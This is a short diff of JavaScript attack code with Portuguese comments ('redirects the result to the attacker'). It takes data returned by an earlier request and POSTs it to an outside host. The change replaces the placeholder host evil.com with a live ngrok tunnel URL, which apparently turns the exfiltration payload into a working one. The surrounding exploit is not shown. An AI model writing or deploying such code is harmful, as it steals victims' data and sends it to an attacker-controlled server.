@@ -30,7 +30,7 @@
         .then(response => response.json())
         .then(data => {
             // Redireciona o resultado para o atacante
-            fetch("http://evil.com/capture", {
+            fetch("https://327b-2804-4580-1080-7db-e5f3-62e8-de0e-c67e.ngrok-free.app", {
                 method: "POST",
                 body: JSON.stringify(data)
             });
